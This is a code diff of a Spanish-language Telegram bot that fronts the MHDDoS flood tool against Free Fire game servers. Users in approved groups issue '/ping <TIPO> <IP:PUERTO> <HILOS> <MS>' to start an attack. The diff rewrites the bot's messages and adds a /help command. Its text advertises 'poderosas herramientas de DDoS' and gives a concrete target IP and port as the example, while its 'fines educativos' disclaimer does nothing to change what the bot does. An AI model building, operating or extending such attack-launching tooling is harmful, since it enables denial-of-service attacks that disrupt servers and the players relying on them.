@@ -40,7 +40,7 @@ def is_allowed(message):
     groups = load_groups()
     if message.chat.id in groups or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
         return True
-    bot.reply_to(message, f"❌ Este bot solo funciona en los grupos autorizados.\n🔗 Únete a este grupo: {GROUP_LINK}")
+    bot.reply_to(message, f"❌ *¡Este bot solo funciona en los grupos autorizados!*\n🔗 Únete a nuestro grupo de *Free Fire* aquí: {GROUP_LINK}")
     return False
 
 @bot.message_handler(commands=["start"])
@@ -50,7 +50,7 @@ def handle_start(message):
 
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
-        text="💻 SOPORTE - OFICIAL 💻",
+        text="💻 *SOPORTE - OFICIAL* 💻",
         url=f"tg://user?id={ADMIN_ID}"
     )
     markup.add(button)
@@ -58,12 +58,13 @@ def handle_start(message):
     bot.send_message(
         message.chat.id,
         (
-            "🤖 *Bienvenido al Bot de Ping MHDDoS [Free Fire]!*\n\n"
-            "📌 *Como usar:*\n"
-            "```/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n\n"
-            "💡 *Ejemplo:*\n"
+            "🎮 *¡Bienvenido al Bot de Ping MHDDoS para Free Fire!*\n\n"
+            "🚀 *Prepárate para dominar el campo de batalla* con nuestras poderosas herramientas de DDoS.\n\n"
+            "📌 *Cómo usarlo:*\n"
+            "```/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>```\n\n"
+            "💡 *Ejemplo de uso:*\n"
             "```/ping UDP 143.92.125.230:10013 3 120```\n\n"
-            "⚠️ *Atención:* Este bot fue creado con fines educativos."
+            "⚠️ *Aviso Importante:* Este bot fue creado para *finalidades educativas*, ¡usa con responsabilidad!"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -78,7 +79,7 @@ def handle_ping(message):
 
     # Verificar cooldown
     if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
-        bot.reply_to(message, "❌ Espere 20 segundos antes de usar este comando nuevamente.")
+        bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
         return
 
     args = message.text.split()
@@ -86,10 +87,10 @@ def handle_ping(message):
         bot.reply_to(
             message,
             (
-                "❌ *Formato inválido!*\n\n"
-                "📌 *Uso correto:*\n"
-                "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
-                "💡 *Ejemplo:*\n"
+                "❌ *Formato inválido!* 🚫\n\n"
+                "📌 *Uso correcto:*\n"
+                "`/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
+                "💡 *Ejemplo de uso:*\n"
                 "`/ping UDP 143.92.125.230:10013 3 120`"
             ),
             parse_mode="Markdown",
@@ -108,23 +109,23 @@ def handle_ping(message):
         cooldowns[telegram_id] = time.time()
 
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))
+        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
 
         bot.reply_to(
             message,
             (
-                "*🔥 Ataque Iniciado 🔥*\n\n"
+                "*🔥 ¡Ataque Iniciado! 🔥*\n\n"
                 f"📍 *IP:* {ip_port}\n"
                 f"⚙️ *Tipo:* {attack_type}\n"
-                f"🧵 *Threads:* {threads}\n"
+                f"🧵 *Hilos:* {threads}\n"
                 f"⏳ *Duración:* {duration}ms\n\n"
-                "*Este bot fue creado por @xFernandoh*"
+                "*Este bot fue creado por @xFernandoh* 🎮"
             ),
             reply_markup=markup,
             parse_mode="Markdown",
         )
     except Exception as e:
-        bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
+        bot.reply_to(message, f"❌ *Error al iniciar el ataque:* {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def handle_stop_attack(call):
@@ -132,7 +133,7 @@ def handle_stop_attack(call):
 
     if call.from_user.id != telegram_id:
         bot.answer_callback_query(
-            call.id, "❌ Solo el usuario que inició el ataque puede pararlo."
+            call.id, "❌ *Solo el usuario que inició el ataque puede pararlo.*"
         )
         return
 
@@ -141,9 +142,9 @@ def handle_stop_attack(call):
         process.terminate()
         del active_attacks[telegram_id]
 
-        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
+        bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
         bot.edit_message_text(
-            "*[⛔] ATAQUE PARADO [⛔]*",
+            "*[⛔] *ATAQUE PARADO* [⛔]*",
             chat_id=call.message.chat.id,
             message_id=call.message.id,
             parse_mode="Markdown",
@@ -151,12 +152,12 @@ def handle_stop_attack(call):
         time.sleep(3)
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
-        bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")
+        bot.answer_callback_query(call.id, "❌ *No hay ataque activo para detener.*")
 
 @bot.message_handler(commands=["addgroup"])
 def handle_addgroup(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ Solo el admin puede agregar grupos.")
+        bot.reply_to(message, "❌ *Solo el admin puede agregar grupos.*")
         return
 
     try:
@@ -166,18 +167,38 @@ def handle_addgroup(message):
 
         # Verificar si el grupo ya está en la lista
         if group_id in groups:
-            bot.reply_to(message, "❌ Este grupo ya está en la lista.")
+            bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
             return
 
         # Agregar el grupo y guardar
         groups.append(group_id)
         save_groups(groups)
 
-        bot.reply_to(message, f"✅ Grupo {group_id} agregado correctamente.")
+        bot.reply_to(message, f"✅ *Grupo {group_id} agregado correctamente.*")
     except IndexError:
-        bot.reply_to(message, "❌ Por favor, proporciona un ID de grupo válido.")
+        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
     except ValueError:
-        bot.reply_to(message, "❌ El ID de grupo debe ser un número válido.")
+        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")
+
+@bot.message_handler(commands=["help"])
+def handle_help(message):
+    if not is_allowed(message):
+        return
+
+    bot.send_message(
+        message.chat.id,
+        (
+            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
+            "*Comandos disponibles:*\n"
+            "1. `/start`: Inicia el bot y te da una breve introducción.\n"
+            "2. `/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia un ataque de ping.\n"
+            "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
+            "4. `/help`: Muestra esta ayuda.\n\n"
+            "⚠️ *Recuerda:* Este bot es para *finalidades educativas* y *no* debe ser usado con fines maliciosos.\n"
+            "¡Juega con responsabilidad y diviértete! 🎮"
+        ),
+        parse_mode="Markdown",
+    )
 
 if __name__ == "__main__":
     bot.infinity_polling()
